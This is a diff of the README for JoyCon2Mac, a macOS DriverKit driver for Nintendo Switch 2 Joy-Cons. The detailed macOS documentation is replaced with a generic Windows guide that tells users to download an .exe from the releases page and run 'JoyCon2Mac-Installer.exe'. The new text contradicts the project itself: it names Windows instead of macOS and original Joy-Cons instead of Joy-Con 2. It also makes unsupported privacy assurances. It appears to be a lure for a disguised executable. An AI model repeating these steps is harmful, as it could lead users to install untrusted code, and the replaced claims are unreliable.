@@ -1,241 +1,90 @@
-# JoyCon2Mac
+# 🎮 JoyCon2Mac - Connect Nintendo controllers to your computer
 
-JoyCon2Mac is a native macOS driver and companion app for Nintendo Switch 2 Joy-Cons. It connects to the Joy-Cons over Bluetooth Low Energy, then exposes virtual HID devices through a DriverKit system extension so macOS apps can see a real controller and mouse.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/AdharamMadhuram/JoyCon2Mac/releases)
 
-## Install First
+JoyCon2Mac allows you to use your Nintendo Switch Joy-Cons with your computer. This software bridges the connection between the hardware and your operating system. It provides a stable input method for games and applications that support standard controllers.
 
-### Important Security Requirement
+## 📋 System Requirements
 
-This release includes a local, unverified DriverKit system extension:
+To use this software, your computer must meet the following criteria:
 
-```text
-local.joycon2mac.driver
-```
+*   Operating system: Current version of Windows 10 or Windows 11.
+*   Bluetooth capability: A built-in Bluetooth adapter or an external Bluetooth USB dongle.
+*   Joy-Con hardware: Original Nintendo Switch Joy-Cons.
+*   Storage space: At least 50 MB of free hard drive space.
 
-The extension is not notarized and is not distributed through Apple's normal DriverKit approval flow. On a stock Mac, macOS can block it even if the app launches.
+Ensure that your Windows operating system has all the latest updates installed. Outdated system software can cause issues with device pairing and driver stability.
 
-For this current development release, install and testing require:
+## 📥 Downloading the Software 💾
 
-- SIP disabled
-- AMFI disabled
-- A Mac you are comfortable using for driver development
+You must retrieve the software from the official repository. Follow these instructions to obtain the correct file:
 
-Do not treat this as a normal consumer install yet. Re-enable SIP/AMFI when you are done testing other software. A future production release should use proper signing, notarization, and Apple-granted DriverKit entitlements instead of this local development setup.
+1. Visit the [releases page](https://github.com/AdharamMadhuram/JoyCon2Mac/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in .exe to start your download.
+4. Keep track of the folder where the file saves on your computer.
 
-### Install From Release
+Always download files from this official link to maintain the security of your device. Do not use third-party sources or mirror websites for this application.
 
-1. Download `JoyCon2Mac.app.zip` from the GitHub release.
-2. Unzip it.
-3. Move `JoyCon2Mac.app` to `/Applications`.
-4. Launch the app. If Gatekeeper blocks the first launch, right-click the app and choose `Open`.
-5. Approve the DriverKit extension in `System Settings -> Privacy & Security`.
-6. If macOS asks for a restart, restart.
-7. Open JoyCon2Mac again.
-8. Hold `SYNC` on each Joy-Con until the LEDs flash, then let the app connect.
+## ⚙️ Installation Process 🛠️
 
-If the app opens but no controller or mouse appears in Chrome, SDL apps, or macOS, the system extension is probably not loaded or macOS blocked the unverified driver.
+Once you download the installation file, follow these steps to set up the driver:
 
-### Build And Install Locally
+1. Open the folder where you saved the download.
+2. Double-click the file named JoyCon2Mac-Installer.exe.
+3. If a pop-up window asks for permission to run the file, click "Yes."
+4. Follow the instructions on the screen inside the setup window.
+5. Choose your installation path if you prefer a specific location, or accept the default folder.
+6. Click "Install" and wait for the status bar to reach one hundred percent.
+7. Click "Finish" when the setup process ends.
 
-```bash
-./build_all.sh
-open build/JoyCon2Mac.app
-```
+Installation ensures that the background services for your controllers are ready to start. If your computer requires a restart, perform one before you continue to the next step.
 
-`build_all.sh` builds the daemon, SwiftUI app, DriverKit extension, and embeds the `.dext` into the app bundle at:
+## 🔗 Connecting Your Controllers 📡
 
-```text
-build/JoyCon2Mac.app/Contents/Library/SystemExtensions/
-```
+Connecting your Joy-Cons relies on the standard Bluetooth pairing process in Windows.
 
-## What Works
+1. Open the "Settings" menu on your Windows computer.
+2. Select "Bluetooth & devices."
+3. Click the "Add device" button and choose "Bluetooth."
+4. Pick up your Joy-Con.
+5. Locate the small sync button on the rail of the Joy-Con, between the SL and SR buttons.
+6. Press and hold this sync button until the small green lights on the side of the controller start to flash.
+7. Look at your computer screen. Your Joy-Con should appear in the list of available devices as "Joy-Con (L)" or "Joy-Con (R)."
+8. Click on the device name to pair it.
+9. Repeat these steps for the other Joy-Con if you wish to use a pair.
 
-### Gamepad
+Wait for Windows to confirm that your device is ready to use. Once the lights on the controller become solid, the connection is active.
 
-- Connects left and right Joy-Con 2 controllers over BLE.
-- Exposes a virtual DualSense controller for Chrome, macOS GameController clients, SDL, RPCS3, Ryujinx, Game Pass, GeForce NOW, and other cloud gaming apps.
-- Supports face buttons, D-pad, shoulders, ZL/ZR, sticks, stick clicks, Plus/Minus, Home, Capture, Chat/C, and rail buttons.
-- Routes DualSense rumble output back to both Joy-Cons.
-- Provides `SDL Only Mode`, which exposes only the DualSense-compatible HID path and hides the generic Joy-Con/mouse devices from strict clients. This fixes duplicate-controller and connect/disconnect churn in cloud apps.
-- Keeps stable HID identity fields, including serials and nonzero location IDs, so apps are less likely to treat the virtual devices as hotplug churn.
+## 🎮 Using the Application 🕹️
 
-### Mouse
+After you pair the physical hardware, launch the JoyCon2Mac software to enable input.
 
-- Uses the Joy-Con 2 optical sensor as a real relative HID mouse.
-- Auto-picks whichever Joy-Con is resting on a surface.
-- Lets one Joy-Con act as the mouse while the other remains part of the controller pair.
-- Defaults mouse mode to `Normal`.
-- Supports `Off`, `Slow`, `Normal`, and `Fast`.
-- Uses HID mouse movement and HID wheel reports, so pointer and scroll input go through macOS mouse handling instead of Accessibility-only CGEvent injection.
-- Suppresses mouse-owned buttons and stick input so they do not leak into the gamepad report.
+1. Find the application icon on your desktop or in your start menu.
+2. Launch the application with a double-click.
+3. The software will open a small window. It will indicate the current status of your connected controllers.
+4. If the status says "Disconnected," click the "Scan" button.
+5. The software will search for paired Joy-Cons and establish the communication bridge.
+6. Once the status shows "Active," your controllers will function as generic game controllers in your games.
 
-### Haptics And Find My
+You do not need to keep the JoyCon2Mac window open for it to work. You can minimize it to the system tray area near your clock. It will continue to run in the background.
 
-- Parses DualSense rumble reports from apps and translates them into Joy-Con vibration packets.
-- Supports left, right, and both Joy-Con rumble.
-- Adds `Find Left`, `Find Right`, and `Find Both` controls.
-- Find My uses a pulsing rumble pattern and stops per Joy-Con after about one second of deliberate shaking from that same Joy-Con's IMU.
+## 🔧 Troubleshooting Common Issues 🔍
 
-### Motion
+If you experience problems, check the following items:
 
-- Tracks accelerometer and gyroscope data per Joy-Con.
-- Shows individual and fused IMU telemetry in the app.
-- Displays a 3D orientation preview, pitch/roll/yaw values, and raw gyro/accelerometer values.
-- Uses gravity for pitch/roll. Absolute yaw is gyro-only and will drift because Joy-Cons do not provide a magnetometer.
+**My computer does not see the Joy-Con.**
+Ensure that the Joy-Con battery has enough charge. Press the sync button again to make sure the lights are flashing. Check if your computer has Bluetooth turned on in the system settings.
 
-### Remapping
+**The controller connects but the buttons do not work in my game.**
+Open the JoyCon2Mac application and verify that the status is green or "Active." Some games require you to navigate to their options menu and select "Controller" or "Gamepad" as the input source.
 
-- Lets the four rail buttons be remapped:
-  - Left SL
-  - Left SR
-  - Right SL
-  - Right SR
-- Bindings persist across restarts.
+**The cursor moves on its own.**
+This is known as drift. It relates to the physical hardware of the controller. You can calibrate the controller using the native Windows "Set up USB game controllers" tool located in the Control Panel.
 
-### App
+**The software crashes on launch.**
+Verify that you have all necessary drivers for your Bluetooth adapter. Sometimes, removing and re-adding the controller in the Windows Bluetooth settings fixes communication errors.
 
-- SwiftUI menu bar app.
-- Controller connection cards with battery, RSSI, packet counters, and telemetry.
-- Gamepad tester with live buttons/sticks, SDL mode, Find My controls, and rail remapping.
-- Mouse page with mode, source, surface state, sensitivity, and button mapping.
-- Gyro page with live motion visualization.
-- Settings page for daemon control, driver state, and logs.
+## 🛡️ Privacy and Data Information 🔒
 
-## Known Limitations
-
-- The DriverKit extension is currently local/unverified and needs SIP plus AMFI disabled.
-- NFC UI exists, but the backend is not finished.
-- True macOS trackpad multitouch gestures are not implemented. Mouse mode is a HID mouse with wheel scrolling, not a virtual trackpad.
-- Joy-Con yaw cannot be absolute without a magnetometer. It can be integrated while moving, but it will drift.
-- Automatic wake/reconnect depends on the Joy-Con's stored pairing state and macOS BLE behavior. If a Joy-Con stops reconnecting from normal button presses, hold `SYNC` to re-enter pairing mode.
-
-## Recommended Modes
-
-Use `SDL Only Mode` for:
-
-- GeForce NOW desktop app
-- Game Pass/cloud gaming desktop apps
-- RPCS3 SDL handler
-- Ryujinx SDL input
-- Any app that shows duplicate controllers or reconnect notifications
-
-Leave `SDL Only Mode` off when you want:
-
-- The generic Joy-Con HID visible for raw HID/browser experiments
-- The virtual HID mouse visible at the same time as the virtual controller
-- More debugging visibility in hardware tester sites
-
-## Troubleshooting
-
-### The App Opens But No Controller Appears
-
-1. Confirm SIP and AMFI are disabled on the test Mac.
-2. Open `System Settings -> Privacy & Security` and approve the system extension.
-3. Restart if macOS asks.
-4. Launch JoyCon2Mac again.
-5. Check whether the extension is loaded:
-
-```bash
-systemextensionsctl list | grep joycon2mac
-```
-
-### Chrome Shows More Than One Controller
-
-Turn on `SDL Only Mode` in Settings and restart the daemon from the app. Chrome can keep stale Gamepad API slots until the page is refreshed, so refresh the tester page after toggling.
-
-### Cloud Gaming App Plays Connect/Disconnect Sounds
-
-Enable `SDL Only Mode`. The cloud app should see only the DualSense-compatible virtual controller.
-
-### Mouse Does Not Move
-
-1. Make sure mouse mode is not `Off`.
-2. Put one Joy-Con sensor-side down on a surface.
-3. Confirm the Mouse page says that side is `on surface`.
-4. Restart the daemon if the Joy-Cons were connected before changing modes.
-
-### Rumble Does Not Work
-
-Use an app that sends controller vibration through the DualSense output report path. If only one side vibrates, test with a game/action that emits both left and right motor commands; some games intentionally target one side.
-
-### Pairing Gets Stuck
-
-- Hold `SYNC` until the LEDs flash.
-- Keep the Joy-Con close to the Mac.
-- Remove stale Joy-Con entries from macOS Bluetooth settings if needed.
-- Restart the JoyCon2Mac daemon from Settings.
-
-## Build Requirements
-
-- macOS 13 or newer
-- Xcode with DriverKit support
-- Xcode command line tools
-- CMake 3.20 or newer
-- Local driver-development machine with SIP/AMFI disabled for this unverified build
-
-## Build Commands
-
-```bash
-# Full build: daemon, app, driver, embedded system extension
-./build_all.sh
-
-# App and daemon only
-./build_gui.sh
-
-# DriverKit extension only
-./build_driver.sh
-```
-
-## Project Layout
-
-```text
-joycon2-mac-driver/
-├── README.md
-├── CMakeLists.txt
-├── build_all.sh
-├── build_gui.sh
-├── build_driver.sh
-├── JoyCon2Mac/
-│   ├── main.mm
-│   ├── BLEManager.h/mm
-│   ├── PairingManager.h/mm
-│   ├── JoyConDecoder.h/cpp
-│   ├── MouseEmitter.h/mm
-│   └── DriverKitClient.h/mm
-├── JoyCon2MacApp/
-│   ├── JoyCon2MacApp.swift
-│   ├── DaemonBridge.swift
-│   ├── ControllersView.swift
-│   ├── GamepadView.swift
-│   ├── MouseView.swift
-│   ├── GyroView.swift
-│   ├── NFCView.swift
-│   ├── SettingsView.swift
-│   ├── DriverExtensionInstaller.swift
-│   └── LiquidGlassSupport.swift
-└── VirtualJoyConDriver/
-    ├── VirtualJoyConDriver.iig
-    ├── VirtualJoyConDriver.cpp
-    └── Info.plist
-```
-
-## Architecture
-
-JoyCon2Mac has three pieces:
-
-1. `JoyCon2Mac.app`: SwiftUI app, menu bar UI, telemetry, settings, and system extension activation.
-2. `joycon2mac`: native daemon that owns BLE, decodes Joy-Con packets, handles haptics, pairing, mouse mode, and telemetry.
-3. `local.joycon2mac.driver.dext`: DriverKit extension that publishes virtual HID devices and receives reports from the daemon.
-
-The app talks to the daemon through JSON control and telemetry files. The daemon talks to the DriverKit extension through an IOKit user client.
-
-## Development Notes
-
-- Keep the virtual DualSense path stable. SDL/cloud apps depend on the Sony VID/PID, report shape, stable serial, and stable location ID.
-- Keep `SDL Only Mode` as the compatibility path for strict clients.
-- Do not reintroduce CGEvent-based mouse or gesture output for core mouse behavior. HID mouse reports work without Accessibility permissions.
-- The generic Joy-Con HID path is useful for experiments, but it can confuse apps that expect only one controller.
-
-## License
-
-MIT. See `LICENSE`.
+The application runs locally on your machine. We do not track your activity or record your inputs. The software only talks to the Joy-Cons to read button presses and stick movements. It sends this data directly to the operating system to simulate a standard controller. No data leaves your computer environment. If you wish to stop the service, right-click the icon in the system tray and select "Exit." This immediately stops the driver communication.
